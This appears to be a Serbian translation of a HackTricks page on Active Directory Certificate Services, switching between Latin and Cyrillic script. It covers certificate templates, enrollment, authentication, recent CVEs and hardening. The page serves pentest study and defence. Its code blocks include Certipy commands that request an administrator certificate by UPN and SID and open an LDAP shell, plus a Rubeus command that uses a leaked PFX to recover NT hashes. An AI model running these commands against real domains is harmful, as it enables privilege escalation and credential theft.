# AD sertifikati

{{#include ../../banners/hacktricks-training.md}}

## Uvod

### Komponente sertifikata

- **Subject** sertifikata označava njegovog vlasnika.
- **Public Key** je povezan sa privatno čuvanim ključem kako bi se sertifikat povezao sa svojim pravim vlasnikom.
- **Validity Period**, definisan datumima **NotBefore** i **NotAfter**, označava period važenja sertifikata.
- Jedinstveni **Serial Number**, koji dodeljuje sertifikaciono telo (CA), identifikuje svaki sertifikat.
- **Issuer** označava CA koji je izdao sertifikat.
- **SubjectAlternativeName** omogućava dodavanje imena za subject, čime se povećava fleksibilnost identifikacije.
- **Basic Constraints** označava da li je sertifikat namenjen CA-u ili krajnjem entitetu i definiše ograničenja upotrebe.
- **Extended Key Usages (EKUs)** određuju konkretne namene sertifikata, kao što su potpisivanje koda ili šifrovanje e-pošte, pomoću identifikatora objekata (OID-ova).
- **Signature Algorithm** navodi metod za potpisivanje sertifikata.
- **Signature**, kreiran privatnim ključem izdavaoca, garantuje autentičnost sertifikata.<sup>[[4]](#references)</sup>

### Posebna razmatranja

- **Subject Alternative Names (SANs)** proširuju primenljivost sertifikata na više identiteta, što je ključno za servere sa više domena. Bezbedni postupci izdavanja su od suštinskog značaja za sprečavanje rizika od lažnog predstavljanja koje napadači mogu ostvariti manipulacijom specifikacijom SAN-a.<sup>[[4]](#references)</sup>

### Sertifikaciona tela (CA) u Active Directory (AD)

AD CS prepoznaje CA sertifikate u AD forest-u putem namenski određenih kontejnera, od kojih svaki ima jedinstvenu ulogu:<sup>[[4]](#references)</sup>

- Kontejner **Certification Authorities** sadrži pouzdane root CA sertifikate.
- Kontejner **Enrolment Services** sadrži podatke o Enterprise CA-ovima i njihovim certificate templates.
- Objekat **NTAuthCertificates** sadrži CA sertifikate ovlašćene za AD autentifikaciju.
- Kontejner **AIA (Authority Information Access)** omogućava proveru lanca sertifikata pomoću intermediate i cross CA sertifikata.

### Dobavljanje sertifikata: tok zahteva klijentskog sertifikata

1. Proces zahteva počinje tako što klijenti pronalaze Enterprise CA.
2. Nakon generisanja para javnog i privatnog ključa, kreira se CSR koji sadrži javni ključ i druge podatke.
3. CA proverava CSR u odnosu na dostupne certificate templates i izdaje sertifikat na osnovu dozvola template-a.
4. Po odobrenju, CA potpisuje sertifikat svojim privatnim ključem i vraća ga klijentu.<sup>[[4]](#references)</sup>

### Certificate templates

Ovi template-i, definisani u AD-ju, navode postavke i дозволе за издавање сертификата, укључујући дозвољене EKU-ове и права за уписивање или измену. Они су кључни за управљање приступом услугама сертификата.<sup>[[4]](#references)</sup>

**Верзија шеме template-а је важна.** Наслеђени **v1** template-и (на пример, уграђени **WebServer** template) немају неколико савремених опција за спровођење смерница. Истраживање **ESC15/EKUwu** показало је да на **v1 template-има** подносилац захтева може да угради **Application Policies/EKUs** у CSR, који имају **предност над** EKU-овима конфигурисаним у template-у. То омогућава добијање сертификата за client-auth, enrollment agent или потписивање кода само уз права за уписивање. Дајте предност **v2/v3 template-има**, уклоните подразумеване v1 template-е или их замените, и строго ограничите EKU-ове на предвиђену намену.<sup>[[1]](#references)</sup>

## Уписивање сертификата

Процес уписивања сертификата покреће администратор који **креира certificate template**, а затим га **објављује** Enterprise Certificate Authority (CA). Тако template постаје доступан клијентима за уписивање. То се постиже додавањем имена template-а у поље `certificatetemplates` објекта Active Directory.<sup>[[4]](#references)</sup>

Да би клијент могао да затражи сертификат, морају му бити додељена **права за уписивање**. Ова права су дефинисана безбедносним дескрипторима на certificate template-у и самом Enterprise CA-у. Да би захтев био успешан, дозволе морају бити додељене на обе локације.<sup>[[4]](#references)</sup>

### Права за уписивање template-а

Ова права су наведена преко Access Control Entries (ACE-ова), који дефинишу дозволе као што су:<sup>[[4]](#references)</sup>

- Права **Certificate-Enrollment** и **Certificate-AutoEnrollment**, свако повезано са одређеним GUID-овима.
- **ExtendedRights**, која омогућавају сва проширена права.
- **FullControl/GenericAll**, која обезбеђују потпуну контролу над template-ом.

### Права за уписивање на Enterprise CA-у

Права CA-а наведена су у његовом безбедносном дескриптору, којем се може приступити преко конзоле за управљање Certificate Authority. Нека подешавања чак омогућавају корисницима са ниским привилегијама даљински приступ, што може представљати безбедносни ризик.<sup>[[4]](#references)</sup>

### Додатне контроле издавања

Могу се применити одређене контроле, као што су:<sup>[[4]](#references)</sup>

- **Одобрење менаџера**: Захтеви остају на чекању док их не одобри менаџер сертификата.
- **Агенти за уписивање и овлашћени потписи**: Одређују број потребних потписа на CSR-у и неопходне OID-ове Application Policy-ја.

### Методе за захтевање сертификата

Сертификати се могу захтевати преко:<sup>[[4]](#references)</sup>

1. **Windows Client Certificate Enrollment Protocol** (MS-WCCE), помоћу DCOM интерфејса.
2. **ICertPassage Remote Protocol** (MS-ICPR), преко именованих цеви или TCP/IP-а.
3. **Веб-интерфејса за уписивање сертификата**, уз инсталирану улогу Certificate Authority Web Enrollment.
4. **Certificate Enrollment Service** (CES), у комбинацији са услугом Certificate Enrollment Policy (CEP).
5. **Network Device Enrollment Service** (NDES) за мрежне уређаје, помоћу протокола Simple Certificate Enrollment Protocol (SCEP).

Корисници оперативног система Windows могу да захтевају сертификате и преко GUI-ја (`certmgr.msc` или `certlm.msc`) или алатки командне линије (`certreq.exe` или PowerShell команде `Get-Certificate`).

```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```

## Autentikacija sertifikatom

Active Directory (AD) podržava autentikaciju sertifikatom, prvenstveno koristeći protokole **Kerberos** i **Secure Channel (Schannel)**.<sup>[[4]](#references)</sup>

### Proces Kerberos autentikacije

U procesu Kerberos autentikacije, zahtev korisnika za Ticket Granting Ticket (TGT) potpisuje se **privatnim ključem** korisnikovog sertifikata. Ovaj zahtev prolazi kroz nekoliko provera koje obavlja kontroler domena, uključujući proveru **validnosti**, **putanje** i **statusa opoziva** sertifikata. Provere obuhvataju i potvrdu da sertifikat potiče iz pouzdanog izvora, kao i proveru da li je izdavalac prisutan u **NTAUTH certificate store**. Uspešne provere rezultuju izdavanjem TGT-a. Objekat **`NTAuthCertificates`** u AD-u nalazi se na:

```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```

ključna je za uspostavljanje poverenja pri autentifikaciji pomoću sertifikata.<sup>[[4]](#references)</sup>

Od uvođenja **KB5014754**, moderna Kerberos autentifikacija pomoću sertifikata uglavnom se odnosi na **snagu mapiranja**, a ne samo na EKU-ove.<sup>[[2]](#references)</sup> U ojačanim šumama:

- Sertifikat koji sadrži samo **UPN/DNS SAN** možda više nije dovoljan za prijavu.
- KDC daje prednost **jakom povezivanju**, obično putem **SID bezbednosnog proširenja** (`1.3.6.1.4.1.311.25.2`) ili jakog eksplicitnog mapiranja u `altSecurityIdentities`.
- Ako sertifikat nema jako mapiranje, DC-ovi beleže **Kdcsvc Event ID 39/41** u režimu kompatibilnosti i odbijaju autentifikaciju u režimu sprovođenja.
- U kombinovanim napadnim putanjama bitni su **ESC9/ESC16** jer uklanjaju SID proširenje iz izdatih sertifikata; operateri se zatim oslanjaju na eksplicitna mapiranja ili SAN URL SID formate kada ih napadna putanja podržava.

### Autentifikacija pomoću Secure Channel (Schannel)

Schannel omogućava bezbedne TLS/SSL veze. Tokom rukovanja klijent predstavlja sertifikat koji, ako je uspešno validiran, odobrava pristup.<sup>[[5]](#references)</sup> Mapiranje sertifikata na AD nalog može da obuhvati Kerberos funkciju **S4U2Self** ili **Subject Alternative Name (SAN)** sertifikata, između ostalih metoda.<sup>[[4]](#references)</sup>

Schannel je ujedno i praktična rezervna opcija kada **PKINIT** nije dostupan. Na primer, ako kontroler domena nema odgovarajući sertifikat **Smart Card Logon**, `certipy auth`/PKINIT alati možda neće moći da pribave TGT, ali isti sertifikat i dalje može da se koristi za autentifikaciju i LDAP operacije preko **LDAPS** ili **LDAP StartTLS**.

### Enumeracija AD Certificate Services

Certificate Services u AD-u mogu se enumerisati pomoću LDAP upita, koji otkrivaju informacije o **Enterprise Certificate Authorities (CA)** i njihovim konfiguracijama. Ovome može da pristupi svaki korisnik autentifikovan na domenu, bez posebnih privilegija.<sup>[[4]](#references)</sup> Alati kao što su **[Certify](https://github.com/GhostPack/Certify)** i **[Certipy](https://github.com/ly4k/Certipy)** koriste se za enumeraciju i procenu ranjivosti u AD CS okruženjima.<sup>[[6]](#references)</sup>

Komande za korišćenje ovih alata uključuju:

```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

### Zastavice za enumeraciju u Certify-ju i PKINIT pomoću Rubeus-a

Sledeće varijante Certify komandi zadržavaju zasebne filtere i opcije izlaza.<sup>[[6]](#references)</sup>

```bash
# Enumerate trusted root CA certificates, Enterprise CAs and HTTP enrollment endpoints
# Useful flags: /domain, /path, /hideAdmins, /showAllPermissions, /skipWebServiceChecks
Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks]

# Identify vulnerable certificate templates and filter for common abuse cases
Certify.exe find
Certify.exe find /vulnerable [/currentuser]
Certify.exe find /enrolleeSuppliesSubject   # ESC1 candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Certify.exe find /clientauth                # templates with client-auth EKU
Certify.exe find /showAllPermissions        # include template ACLs in output
Certify.exe find /json /outfile:C:\Temp\adcs.json

# Enumerate PKI object ACLs (Enterprise PKI container, templates, OIDs) – useful for ESC4/ESC7 discovery
Certify.exe pkiobjects [/domain:domain.local] [/showAdmins]

# Use Certipy for enumeration and identifying vulnerable templates
certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

Rubeus može da koristi i PFX sertifikat zaštićen lozinkom za PKINIT autentifikaciju i zatraži TGT. Opcioni prekidač `/getcredentials` zahteva U2U servisni tiket i pokušava da oporavi NT hash naloga:<sup>[[7]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
```

Za zloupotrebu predložaka i CA specifičnu za ESC, pogledajte [AD CS Domain Escalation](ad-certificates/domain-escalation.md).

---

## Nedavne ranjivosti i bezbednosna ažuriranja (2022-2025)

| Godina | ID / Naziv | Uticaj | Ključne napomene |
|------|-----------|--------|----------------|
| 2022 | **CVE-2022-26923** – „Certifried“ / ESC6 | *Eskalacija privilegija* lažiranjem sertifikata naloga računara tokom PKINIT-a. | Ispravka je uključena u bezbednosna ažuriranja od **10. maja 2022.** Kontrole za reviziju i snažno mapiranje uvedene su putem **KB5014754**; okruženja bi sada trebalo da budu u režimu *Full Enforcement*.  |
| 2023 | **CVE-2023-35350 / 35351** | *Daljinsko izvršavanje koda* u ulogama AD CS Web Enrollment (certsrv) i CES. | Javno dostupnih PoC-ova ima malo, ali su ranjive IIS komponente često izložene unutar mreže. Ispravka je dostupna od izdanja Patch Tuesday iz **jula 2023.**  |
| 2024 | **CVE-2024-49019** – „EKUwu“ / ESC15 | Na **v1 predlošcima**, podnosilac zahteva sa pravima za upisivanje može da ugradi **Application Policies/EKUs** u CSR, koje imaju prednost nad EKU-ovima predloška, čime se dobijaju sertifikati za client-auth, enrollment agent ili potpisivanje koda. | Ispravljeno od **12. novembra 2024.** Zamenite ili nadjačajte v1 predloške (npr. podrazumevani WebServer), ograničite EKU-ove prema nameni i ograničite prava za upisivanje. |

### Vremenska linija Microsoftovog ojačavanja bezbednosti (KB5014754)

Microsoft je uveo postepeno uvođenje u tri faze (Compatibility → Audit → Enforcement) kako bi Kerberos autentifikaciju sertifikatima udaljio od slabih implicitnih mapiranja. Od **11. februara 2025.**, kontroleri domena automatski prelaze na **Full Enforcement** ako vrednost registra `StrongCertificateBindingEnforcement` nije podešena. Microsoft je kasnije ažurirao vremensku liniju tako da povratak u režim kompatibilnosti ostaje moguć do bezbednosnog ažuriranja od **9. septembra 2025.**<sup>[[2]](#references)</sup> Administratori bi trebalo da:

1. Instaliraju zakrpe na svim DC-ovima i AD CS serverima (iz maja 2022. ili novije).
2. Tokom faze *Audit* prate Event ID 39/41 zbog slabih mapiranja.
3. Ponovo izdaju client-auth sertifikate sa novim **SID extension** ili podese snažna ručna mapiranja pre nego što Enforcement blokira slaba mapiranja.

### Napomene za operatere u ojačanim šumama

- **ESC1/ESC6 sami po sebi više ne obuhvataju celu priču** u okruženjima iz 2025. i novijim. Ako zatražite sertifikat za drugog principal-a, obično vam je potreban i artefakt snažnog mapiranja, kao što su SID extension ili eksplicitno mapiranje.
- **ESC15 (EKUwu)** je najkorisniji u okruženjima bez zakrpa, jer bezazlene **v1** predloške poput **WebServer** pretvara u sertifikate sposobne za autentifikaciju ili ulogu enrollment agent-a ubacivanjem **Application Policies**. Kerberos PKINIT i dalje proverava EKU-ove, ali **LDAP Schannel** uvažava i Application Policies, pa zloupotrebe zasnovane na LDAP-u ostaju relevantne.<sup>[[1]](#references)</sup>
- **ESC16** je podešavanje na nivou CA: ako CA globalno onemogući SID security extension, svaki izdat sertifikat prelazi na slabije ponašanje mapiranja, osim ako lanac napada ne ubaci SID u nekom drugom podržanom formatu.
- **Prava ESC7 su različita:** dodela `ManageCA` na CA može da omogući izmene podešavanja kao što je `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6), dok `ManageCertificates` upravlja odobravanjem zahteva. Eksplicitni Deny za prava upravitelja sertifikata može da blokira taj način odobravanja čak i kada postoji i Allow; pre povezivanja podešavanja i predložaka procenite efektivni ACL CA. Pogledajte [Microsoftovu procenu CA ACL-a](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting).

---

## Poboljšanja otkrivanja i ojačavanja bezbednosti

* **Defender for Identity AD CS sensor (2023-2024)** sada prikazuje procene bezbednosnog stanja za ESC1-ESC8/ESC11 i generiše upozorenja u realnom vremenu, kao što su *„Izdavanje sertifikata za kontroler domena za sistem koji nije DC“* (ESC8) i *„Sprečavanje upisa sertifikata sa proizvoljnim Application Policies“* (ESC15). Da biste iskoristili ova otkrivanja, postavite senzore na sve AD CS servere.<sup>[[3]](#references)</sup>
* Onemogućite opciju **“Supply in the request”** na svim predlošcima ili strogo ograničite njenu primenu; prednost dajte eksplicitno definisanim SAN/EKU vrednostima.
* Uklonite **Any Purpose** ili **No EKU** iz predložaka, osim ako su zaista neophodni (rešava scenarije ESC2).
* Za osetljive predloške (npr. WebServer / CodeSigning) zahtevajte **odobrenje menadžera** ili namenske tokove rada Enrollment Agent-a.
* Ograničite web enrollment (`certsrv`) i CES/NDES krajnje tačke na pouzdane mreže ili ih postavite iza autentifikacije klijentskim sertifikatom.
* Nametnite šifrovanje RPC enrollment-a (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`) da biste ublažili ESC11 (RPC relay). Ova zastavica je **podrazumevano uključena**, ali se često isključuje zbog zastarelih klijenata, čime se ponovo otvara rizik od relay napada.
* Zaštitite **krajnje tačke enrollment-a zasnovane na IIS-u** (CES/Certsrv): gde je moguće, onemogućite NTLM ili zahtevajte HTTPS + Extended Protection da biste blokirali ESC8 relay napade.

Procenu ESC11 obavite na hostu na kom radi CA, a koji može biti server član domena, a ne kontroler domena. Pročitajte `InterfaceFlags` aktivnog CA-a iz `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration`; vrednost koja ne može da se pročita ili nedostaje znači da je rezultat nepoznat, a ne da je RPC enkripcija sigurno onemogućena. Očišćen bit `IF_ENFORCEENCRYPTICERTREQUEST` ukazuje na konfiguraciju koju treba dalje proveriti, ali su i dalje potrebni dostupan RPC endpoint za enrollment, kredencijali podložni prinudi i upotrebljiv predložak sertifikata. Kod ESC8, sam HTTP NTLM izazov nije dovoljan: potvrdite da postoji ispravan enrollment endpoint.

---

## References

- [1] [EKUwu: Ne samo još jedan AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [2] [KB5014754: Promene autentifikacije zasnovane na sertifikatima na Windows kontrolerima domena](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [3] [Procene bezbednosnog stanja sertifikata - Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [4] [Certified Pre-Owned: Zloupotreba Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [5] [Šta je SSL/TLS autentifikacija klijenta i kako funkcioniše?](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html)
- [6] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [7] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
{{#include ../../banners/hacktricks-training.md}}
